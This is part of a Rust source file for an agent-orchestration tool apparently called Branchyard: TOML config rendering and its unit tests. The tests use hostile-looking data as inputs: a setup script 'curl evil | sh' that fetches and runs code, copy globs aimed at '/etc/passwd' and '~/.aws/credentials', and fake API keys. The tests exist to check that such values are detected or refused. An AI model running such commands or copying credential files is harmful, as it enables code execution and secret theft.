    ));
    let d = &config.defaults;
    if !d.is_empty() {
        out.push_str(
            "\n# Defaults for new branches (by run, by fan); flags override them.\n[defaults]\n",
        );
        let mut line = |key: &str, value: Option<String>| {
            if let Some(value) = value {
                out.push_str(&format!("{key} = {value}\n"));
            }
        };
        line("harness", d.harness.as_deref().map(toml_string));
        line("model", d.model.as_deref().map(toml_string));
        line("effort", d.effort.as_deref().map(toml_string));
        line("auth", d.auth.as_deref().map(toml_string));
        line("budget_usd", d.budget_usd.map(toml_number));
        line("max_turns", d.max_turns.map(|n| n.to_string()));
        line("max_minutes", d.max_minutes.map(toml_number));
        line(
            "permissions",
            d.permissions.map(|p| toml_string(p.as_str())),
        );
        line("isolated", d.isolated.map(|b| b.to_string()));
        line("check", d.check.as_deref().map(toml_string));
        line(
            "provider",
            d.provider.map(|p| {
                toml_string(match p {
                    ProviderKind::Local => "local",
                    ProviderKind::Microsandbox => "microsandbox",
                    ProviderKind::Recipe => "recipe",
                })
            }),
        );
        line("recipe", d.recipe.as_deref().map(toml_string));
        line("instructions", d.instructions.as_deref().map(toml_string));
    }
    if !config.secrets.is_empty() {
        out.push_str(
            "\n# Secrets by name: \"VAR\" reads that variable, \"@path\" a file. Never a value.\n[secrets]\n",
        );
        for (name, source) in &config.secrets {
            out.push_str(&format!("{name} = {}\n", toml_string(source)));
        }
    }
    if !config.mcp.is_empty() {
        out.push_str("\n# Stdio MCP servers: NAME = \"/absolute/command args\".\n[mcp]\n");
        for (name, command) in &config.mcp {
            out.push_str(&format!("{name} = {}\n", toml_string(command)));
        }
    }
    if let Some(sandbox) = &config.microsandbox {
        out.push_str("\n[microsandbox]\n");
        out.push_str(&format!("image = {}\n", toml_string(&sandbox.image)));
        if let Some(cpus) = sandbox.cpus {
            out.push_str(&format!("cpus = {cpus}\n"));
        }
        if let Some(mib) = sandbox.memory_mib {
            out.push_str(&format!("memory_mib = {mib}\n"));
        }
        if !sandbox.pass_env.is_empty() {
            let names: Vec<String> = sandbox.pass_env.iter().map(|n| toml_string(n)).collect();
            out.push_str(&format!("pass_env = [{}]\n", names.join(", ")));
        }
        if let Some(keep) = &sandbox.keep {
            out.push_str(&format!("keep = {}\n", toml_string(keep)));
        }
        if let Some(n) = sandbox.snapshots {
            out.push_str(&format!("snapshots = {n}\n"));
        }
        if let Some(n) = sandbox.max_paused {
            out.push_str(&format!("max_paused = {n}\n"));
        }
        if let Some(on) = sandbox.live_branch {
            out.push_str(&format!("live_branch = {on}\n"));
        }
    }
    if !config.remote.is_empty() {
        out.push_str("\n# A Branchyard server to run commands against; BRANCHYARD_REMOTE and friends override it.\n[remote]\n");
        let r = &config.remote;
        for (key, value) in [
            ("url", &r.url),
            ("token_file", &r.token_file),
            ("ca_file", &r.ca_file),
            ("repo", &r.repo),
        ] {
            if let Some(value) = value {
                out.push_str(&format!("{key} = {}\n", toml_string(value)));
            }
        }
    }
    if let Some(path) = &config.serve.config {
        out.push_str(&format!("\n[serve]\nconfig = {}\n", toml_string(path)));
    }
    let n = &config.notify;
    if !n.is_empty() {
        out.push_str(
            "\n# When a branch needs you or ends: by watch and a waiting by run.\n[notify]\n",
        );
        if let Some(enabled) = n.enabled {
            out.push_str(&format!("enabled = {enabled}\n"));
        }
        if let Some(desktop) = n.desktop {
            out.push_str(&format!("desktop = {desktop}\n"));
        }
        if let Some(terminal) = n.terminal {
            let name = match terminal {
                NotifyTerminal::Auto => "auto",
                NotifyTerminal::Osc9 => "osc9",
                NotifyTerminal::Osc777 => "osc777",
                NotifyTerminal::Bell => "bell",
                NotifyTerminal::None => "none",
            };
            out.push_str(&format!("terminal = {}\n", toml_string(name)));
        }
    }
    let c = &config.connectors;
    if !c.is_empty() {
        out.push_str(
            "\n# The connector gateway (Anvil) and default grants; see docs/connectors.md.\n\
             [connectors]\n",
        );
        for (key, value) in [
            ("gateway", &c.gateway),
            ("sandbox_gateway", &c.sandbox_gateway),
            ("bundles", &c.bundles),
            ("anvil", &c.anvil),
            ("listen", &c.listen),
            ("vault_key", &c.vault_key),
        ] {
            if let Some(value) = value {
                out.push_str(&format!("{key} = {}\n", toml_string(value)));
            }
        }
        if !c.grants.is_empty() {
            let grants: Vec<String> = c.grants.iter().map(|g| toml_string(g)).collect();
            out.push_str(&format!("grants = [{}]\n", grants.join(", ")));
        }
    }
    let n = &config.network;
    if !n.is_empty() {
        out.push_str(
            "\n# The hosts a new branch's harness may reach; see docs/egress.md.\n[network]\n",
        );
        if let Some(allow) = &n.allow {
            let rules: Vec<String> = allow.iter().map(|r| toml_string(r)).collect();
            out.push_str(&format!("allow = [{}]\n", rules.join(", ")));
        }
        if let Some(enforce) = n.enforce {
            let name = match enforce {
                NetworkEnforceMode::BestEffort => "best_effort",
                NetworkEnforceMode::Required => "required",
            };
            out.push_str(&format!("enforce = {}\n", toml_string(name)));
        }
    }
    if let Some(workspace) = &config.workspace {
        out.push_str(
            "\n# What each new branch's worktree gets before its first turn, and what runs when\n\
             # it is removed. Scripts run only after `by workspace trust`. See docs/workspace.md.\n",
        );
        render_workspace(&mut out, "workspace", workspace);
    }
    if !config.fleet.is_empty() {
        out.push_str(
            "\n# Who runs each kind of task; `by run` without --harness routes among them.\n\
             # See docs/fleet.md.\n",
        );
        let table: BTreeMap<&str, &BTreeMap<String, FleetConfig>> =
            [("fleet", &config.fleet)].into_iter().collect();
        out.push_str(&toml::to_string(&table).unwrap_or_default());
    }
    for (root, project) in &config.projects {
        if let Some(workspace) = &project.workspace {
            out.push_str(&format!(
                "\n# Replaces {root}'s own [workspace], for you only.\n"
            ));
            render_workspace(
                &mut out,
                &format!("projects.{}.workspace", toml_string(root)),
                workspace,
            );
        }
    }
    out
}

fn render_workspace(out: &mut String, table: &str, workspace: &WorkspaceConfig) {
    out.push_str(&format!("[{table}]\n"));
    if !workspace.copy.is_empty() {
        let globs: Vec<String> = workspace.copy.iter().map(|g| toml_string(g)).collect();
        out.push_str(&format!("copy = [{}]\n", globs.join(", ")));
    }
    if !workspace.setup.is_empty() {
        out.push_str(&format!("setup = {}\n", workspace.setup.render()));
    }
    if !workspace.teardown.is_empty() {
        out.push_str(&format!("teardown = {}\n", workspace.teardown.render()));
    }
    if workspace.prepare {
        out.push_str("prepare = true\n");
    }
    for (key, list) in [("inputs", &workspace.inputs), ("share", &workspace.share)] {
        if !list.is_empty() {
            let items: Vec<String> = list.iter().map(|g| toml_string(g)).collect();
            out.push_str(&format!("{key} = [{}]\n", items.join(", ")));
        }
    }
    for (name, run) in &workspace.run {
        out.push_str(&format!("\n[{table}.run.{name}]\n"));
        out.push_str(&format!("command = {}\n", run.command.render()));
        if run.default {
            out.push_str("default = true\n");
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const FULL: &str = r#"
version = 1
[defaults]
harness = "codex"
model = "large"
effort = "high"
budget_usd = 5
max_turns = 20
max_minutes = 30.5
permissions = "ask"
isolated = true
check = "cargo test --workspace"
provider = "microsandbox"
[secrets]
OPENAI_API_KEY = "OPENAI_API_KEY"
CODEX_AUTH = "@~/.codex/auth.json"
[mcp]
docs = "/usr/local/bin/docs-mcp --stdio"
[remote]
url = "https://by.example:8421"
token_file = "tokens/me.token"
[serve]
config = ".branchyard/server.json"
[microsandbox]
image = "ghcr.io/you/codex:1"
pass_env = ["OPENAI_API_KEY"]
[notify]
desktop = true
terminal = "osc777"
[fleet.default]
candidates = [{ harness = "claude-code", model = "large", effort = "high" }, { harness = "codex" }]
attempts = 2
budget_usd = 3
failover = true
judge = { harness = "claude-code", rubric = "Prefer small diffs." }
[fleet.docs]
candidates = [{ harness = "codex", effort = "low" }]
exploration = 0
connectors = ["github"]
environment = "rust"
[connectors]
gateway = "http://127.0.0.1:8931/mcp"
sandbox_gateway = "http://192.168.127.1:8931/mcp"
bundles = "connectors"
anvil = "node /opt/anvil/bin-anvil.js"
grants = ["github:read", "linear@work:write:issues.*"]
"#;

    #[test]
    fn a_full_file_parses_and_renders_back_to_itself() {
        let config = parse(FULL).unwrap();
        assert_eq!(config.defaults.harness.as_deref(), Some("codex"));
        assert_eq!(config.notify.desktop, Some(true));
        assert_eq!(config.notify.terminal, Some(NotifyTerminal::Osc777));
        assert_eq!(config.flatten()["notify.terminal"], "osc777");
        assert_eq!(config.defaults.budget_usd, Some(5.0));
        let rendered = render(&config, "test");
        assert!(rendered.starts_with("#:schema https://"), "{rendered}");
        assert_eq!(parse(&rendered).unwrap(), config);
    }

    #[test]
    fn network_and_permission_presets_are_checked_and_render_back() {
        let text = "version = 1\n\n[defaults]\npermissions = \"edit-worktree\"\n\n[network]\n\
                    allow = [\"github.com\", \"*.npmjs.org:443\"]\nenforce = \"required\"\n";
        let config = parse(text).unwrap();
        assert_eq!(
            config.defaults.permissions,
            Some(PermissionsMode::EditWorktree)
        );
        let network = config.network.policy().unwrap().unwrap();
        assert_eq!(
            network.to_string(),
            "github.com, *.npmjs.org:443 (required)"
        );
        assert_eq!(parse(&render(&config, "test")).unwrap(), config);
        assert_eq!(
            parse("[network]\nallow = []\n")
                .unwrap()
                .network
                .policy()
                .unwrap(),
            Some(branchyard_provision::network::Network::none())
        );
        assert_eq!(
            parse("version = 1\n").unwrap().network.policy().unwrap(),
            None
        );
        for (text, needle) in [
            ("[network]\nallow = [\"https://x.com\"]\n", "network.allow"),
            ("[network]\nallow = [\"*\"]\n", "network.allow"),
            ("[network]\nenforce = \"required\"\n", "nothing to enforce"),
            ("[network]\nenforce = \"always\"\n", "best_effort"),
            ("[network]\nports = [1]\n", "ports"),
            ("[defaults]\npermissions = \"yolo\"\n", "edit-worktree"),
        ] {
            let error = parse(text).unwrap_err().to_string();
            assert!(error.contains(needle), "{text}: {error}");
        }
    }

    #[test]
    fn connectors_are_checked_with_the_flags_parser() {
        let config = parse(FULL).unwrap();
        let grants = config.connectors.grant_entries().unwrap();
        assert_eq!(grants[1].to_string(), "linear@work:write:issues.*");
        assert_eq!(
            config.flatten()["connectors.gateway"],
            "http://127.0.0.1:8931/mcp"
        );
        for (text, needle) in [
            (
                "[connectors]\ngateway = \"127.0.0.1:8931\"\n",
                "connectors.gateway",
            ),
            (
                "[connectors]\ngateway = \"http://h/mcp\"\ngrants = [\"github:admin\"]\n",
                "connectors.grants",
            ),
            ("[connectors]\ngrants = [\"github\"]\n", "need a gateway"),
            (
                "[connectors]\ngateway = \"http://h/mcp\"\nbundles = \" \"\n",
                "connectors.bundles",
            ),
            ("[connectors]\ngatway = \"http://h/mcp\"\n", "gatway"),
        ] {
            let error = parse(text).unwrap_err().to_string();
            assert!(error.contains(needle), "{text}: {error}");
        }
    }

    #[test]
    fn unknown_keys_and_bad_values_are_refused_by_name() {
        for (text, needle) in [
            ("[defaults]\nharnes = \"codex\"", "harnes"),
            (
                "[fleet.chores]\ncandidates = [{ harness = \"codex\" }]",
                "fleet.chores",
            ),
            ("[fleet.docs]\ncandidates = []", "fleet.docs.candidates"),
            (
                "[fleet.docs]\ncandidates = [{ harness = \"nope\" }]",
                "fleet.docs.candidates[0].harness",
            ),
            (
                "[fleet.docs]\ncandidates = [{ harness = \"codex\", effort = \"max\" }]",
                "fleet.docs.candidates[0].effort",
            ),
            (
                "[fleet.docs]\ncandidates = [{ harness = \"codex\" }, { harness = \"codex\" }]",
                "is listed twice",
            ),
            (
                "[fleet.docs]\ncandidates = [{ harness = \"codex\", modle = \"x\" }]",
                "modle",
            ),
            (
                "[fleet.docs]\ncandidates = [{ harness = \"codex\" }]\nattempts = 0",
                "fleet.docs.attempts",
            ),
            (
                "[fleet.docs]\ncandidates = [{ harness = \"codex\" }]\nexploration = 2",
                "fleet.docs.exploration",
            ),
            (
                "[fleet.docs]\ncandidates = [{ harness = \"codex\" }]\njudge = { harness = \"x\" }",
                "fleet.docs.judge.harness",
            ),
            (
                "[fleet.docs]\ncandidates = [{ harness = \"codex\" }]\nbudget = 3",
                "budget",
            ),
            ("[defaults]\nharness = \"nope\"", "defaults.harness"),
            ("[defaults]\neffort = \"extreme\"", "defaults.effort"),
            ("[defaults]\nbudget_usd = -1", "defaults.budget_usd"),
            (
                "[defaults]\npermissions = \"always\"",
                "line 2: unknown variant `always`",
            ),
            ("[secrets]\nKEY = \"sk-ant-api03 value\"", "secrets.KEY"),
            ("[mcp]\ndocs = \"\"", "mcp.docs"),
            ("[remote]\nurl = \"ftp://x\"", "remote.url"),
            ("version = 2", "version"),
            ("[defaults]\nprovider = \"microsandbox\"", "[microsandbox]"),
            ("[notify]\nsound = true", "unknown field `sound`"),
            ("[notify]\nterminal = \"osc99\"", "unknown variant `osc99`"),
            ("[notify]\nenabled = \"no\"", "line 2"),
            (
                "[notify]\nenabled = false\ndesktop = true",
                "notify.desktop: has no effect",
            ),
        ] {
            let error = parse(text).unwrap_err().to_string();
            assert!(error.contains(needle), "{text}: {error}");
        }
    }

    #[test]
    fn a_secret_error_never_echoes_the_value() {
        for value in [
            "sk-ant-api03-SECRETVALUE",
            "ghp_SECRETVALUE0123",
            "Ab3dEf6hIj9kLm2nOp5qRs8t",
            "has space SECRETVALUE",
        ] {
            let error = parse(&format!("[secrets]\nKEY = \"{value}\""))
                .unwrap_err()
                .to_string();
            assert!(error.contains("secrets.KEY"), "{error}");
            assert!(
                !error.contains(value) && !error.contains("SECRETVALUE"),
                "{error}"
            );
        }
        assert!(check_secret_reference("ANTHROPIC_API_KEY").is_ok());
        assert!(check_secret_reference("@~/.codex/auth.json").is_ok());
    }

    #[test]
    fn layers_merge_key_by_key_with_sources() {
        let user =
            parse("[defaults]\nharness = \"codex\"\nmax_turns = 5\n[secrets]\nA = \"A\"").unwrap();
        let project = parse("[defaults]\nharness = \"claude-code\"\n[secrets]\nB = \"B\"").unwrap();
        let merged = merge(
            &[
                (Source::User { path: "u".into() }, user),
                (Source::Project { path: "p".into() }, project),
            ],
            |name| (name == "BRANCHYARD_REMOTE").then(|| "http://127.0.0.1:1".to_owned()),
        )
        .unwrap();
        assert_eq!(
            merged.config.defaults.harness.as_deref(),
            Some("claude-code")
        );
        assert_eq!(merged.config.defaults.max_turns, Some(5));
        assert_eq!(merged.config.secrets.len(), 2);
        assert_eq!(
            merged.config.remote.url.as_deref(),
            Some("http://127.0.0.1:1")
        );
        assert_eq!(
            merged.sources["defaults.harness"],
            Source::Project { path: "p".into() }
        );
        assert_eq!(
            merged.sources["defaults.max_turns"],
            Source::User { path: "u".into() }
        );
        assert_eq!(
            merged.sources["remote.url"],
            Source::Env {
                var: "BRANCHYARD_REMOTE".into()
            }
        );
    }

    #[test]
    fn paths_resolve_against_the_file_and_home() {
        let mut config = parse(FULL).unwrap();
        config.resolve_paths(Path::new("/repo"), Some(Path::new("/home/me")));
        assert_eq!(
            config.remote.token_file.as_deref(),
            Some("/repo/tokens/me.token")
        );
        assert_eq!(config.secrets["CODEX_AUTH"], "@/home/me/.codex/auth.json");
        assert_eq!(config.secrets["OPENAI_API_KEY"], "OPENAI_API_KEY");
    }

    const WORKSPACE: &str = r#"
[workspace]
copy = [".env", ".env.*"]
setup = "pnpm install"
teardown = ["docker compose down", "rm -rf tmp"]
[workspace.run.dev]
command = "pnpm dev --port $BRANCHYARD_PORT"
default = true
[workspace.run.worker]
command = ["pnpm build", "pnpm worker"]
"#;

    #[test]
    fn a_workspace_parses_renders_back_and_names_its_run_scripts() {
        let config = parse(WORKSPACE).unwrap();
        let workspace = config.workspace.clone().unwrap();
        assert_eq!(workspace.copy, [".env", ".env.*"]);
        assert_eq!(workspace.setup.commands(), ["pnpm install"]);
        assert_eq!(workspace.teardown.commands().len(), 2);
        assert!(workspace.has_scripts());
        let rendered = render(&config, "test");
        assert_eq!(
            parse(&rendered).unwrap().workspace,
            config.workspace,
            "{rendered}"
        );
        assert_eq!(
            workspace.run_script(None).unwrap(),
            (
                "dev".to_owned(),
                vec!["pnpm dev --port $BRANCHYARD_PORT".to_owned()]
            )
        );
        assert_eq!(workspace.run_script(Some("worker")).unwrap().1.len(), 2);
        assert!(workspace
            .run_script(Some("nope"))
            .unwrap_err()
            .contains("dev, worker"));
        // Copy only: no scripts, nothing to trust.
        let copy = parse("[workspace]\ncopy = [\".env\"]")
            .unwrap()
            .workspace
            .unwrap();
        assert!(!copy.has_scripts());
        assert!(copy.run_script(None).is_err());
    }

    #[test]
    fn a_workspace_that_could_leave_the_repository_or_is_malformed_is_refused() {
        for (text, needle) in [
            ("[workspace]\ncopy = [\"../secrets\"]", "workspace.copy"),
            ("[workspace]\ncopy = [\"/etc/passwd\"]", "relative"),
            ("[workspace]\ncopy = [\"~/.aws/credentials\"]", "relative"),
            ("[workspace]\ncopy = [\".git/config\"]", ".git"),
            ("[workspace]\ncopy = [\"[\"]", "not a glob"),
            ("[workspace]\nsetup = \"  \"", "workspace.setup"),
            ("[workspace]\nsetup = 3", "line 2"),
            ("[workspace]\nstartup = \"x\"", "startup"),
            ("[workspace.run.dev]\ndefault = true", "command"),
            (
                "[workspace.run.\"a b\"]\ncommand = \"x\"",
                "workspace.run.a b",
            ),
            (
                "[workspace.run.a]\ncommand = \"x\"\ndefault = true\n\
                 [workspace.run.b]\ncommand = \"y\"\ndefault = true",
                "only one",
            ),
            (
                "[projects.\"relative\".workspace]\nsetup = \"x\"",
                "absolute",
            ),
            ("[workspace]\nprepare = true", "workspace.prepare"),
            (
                "[workspace]\nsetup = \"x\"\nshare = [\"node_modules\"]",
                "only used with prepare",
            ),
            (
                "[workspace]\nsetup = \"x\"\nprepare = true\nshare = [\"node_*\"]",
                "literal",
            ),
            (
                "[workspace]\nsetup = \"x\"\nprepare = true\nshare = [\"../x\"]",
                "workspace.share",
            ),
            (
                "[workspace]\nsetup = \"x\"\nprepare = true\ninputs = [\"/etc/x\"]",
                "workspace.inputs",
            ),
        ] {
            let error = parse(text).unwrap_err().to_string();
            assert!(error.contains(needle), "{text}: {error}");
        }
    }

    #[test]
    fn the_digest_changes_with_any_glob_or_command() {
        let base = parse(WORKSPACE).unwrap().workspace.unwrap();
        let digest = base.digest();
        assert_eq!(digest.len(), 64);
        assert_eq!(
            parse(WORKSPACE).unwrap().workspace.unwrap().digest(),
            digest
        );
        let mut changed = base.clone();
        changed.setup = Script::One("pnpm install && curl evil | sh".into());
        assert_ne!(changed.digest(), digest);
        let mut changed = base.clone();
        changed.copy.push("secrets/*".into());
        assert_ne!(changed.digest(), digest);
        let mut changed = base.clone();
        changed.run.get_mut("dev").unwrap().default = false;
        assert_ne!(changed.digest(), digest);
        // One command or a list of one are the same script.
        let mut same = base;
        same.setup = Script::Many(vec!["pnpm install".into()]);
        assert_eq!(same.digest(), digest);
    }

    #[test]
    fn a_prepared_workspace_parses_renders_back_and_changes_the_digest_only_when_on() {
        let text = "[workspace]\nsetup = \"pnpm install\"\nprepare = true\n\
                    inputs = [\"pnpm-lock.yaml\", \"packages/*/package.json\"]\n\
                    share = [\"node_modules/\"]\n";
        let config = parse(text).unwrap();
        let workspace = config.workspace.clone().unwrap();
        assert!(workspace.prepare);
        assert_eq!(workspace.inputs.len(), 2);
        assert_eq!(
            parse(&render(&config, "")).unwrap().workspace,
            config.workspace
        );
        let mut off = workspace.clone();
        off.prepare = false;
        off.inputs.clear();
        off.share.clear();
        let plain = parse("[workspace]\nsetup = \"pnpm install\"").unwrap();
        assert_eq!(off.digest(), plain.workspace.unwrap().digest());
        assert_ne!(workspace.digest(), off.digest());
        let mut shared = workspace.clone();
        shared.share.push("vendor/bundle".into());
        assert_ne!(shared.digest(), workspace.digest());
    }

    #[test]
    fn the_user_files_project_entry_replaces_the_repositorys_workspace() {
        let project = parse(WORKSPACE).unwrap();
        let mut user = parse(
            "[projects.\"~/src/app\".workspace]\nsetup = \"npm ci\"\n\
             [projects.\"/elsewhere\".workspace]\nsetup = \"x\"",
        )
        .unwrap();
        user.resolve_paths(
            Path::new("/home/me/.config/branchyard"),
            Some(Path::new("/home/me")),
        );
        assert!(user.projects.contains_key("/home/me/src/app"));
        let (workspace, origin) =
            effective_workspace("/home/me/src/app/", Some(&project), Some(&user)).unwrap();
        assert_eq!(origin, WorkspaceOrigin::User);
        assert_eq!(workspace.setup.commands(), ["npm ci"]);
        let (workspace, origin) =
            effective_workspace("/home/me/src/other", Some(&project), Some(&user)).unwrap();
        assert_eq!(origin, WorkspaceOrigin::Project);
        assert_eq!(workspace.setup.commands(), ["pnpm install"]);
        assert!(effective_workspace("/x", None, Some(&user)).is_none());
        // Each section in its own file only.
        assert!(project.check_layer(Layer::Project).is_ok());
        assert!(project.check_layer(Layer::User).is_err());
        assert!(user.check_layer(Layer::User).is_ok());
        assert!(user.check_layer(Layer::Project).is_err());
        assert_eq!(Layer::of(Path::new("/r/branchyard.toml")), Layer::Project);
        assert_eq!(Layer::of(Path::new("/u/config.toml")), Layer::User);
        // It survives the key-by-key merge.
        let merged = merge(
            &[
                (Source::User { path: "u".into() }, user.clone()),
                (Source::Project { path: "p".into() }, project.clone()),
            ],
            |_| None,
        )
        .unwrap();
        assert_eq!(merged.config.workspace, project.workspace);
        assert_eq!(merged.config.projects, user.projects);
    }

    #[test]
    fn words_split_like_the_check_flag() {
        assert_eq!(
            split_words("cargo test -- 'a b'").unwrap(),
            ["cargo", "test", "--", "a b"]
        );
        assert!(split_words("'open").is_err());
    }
}
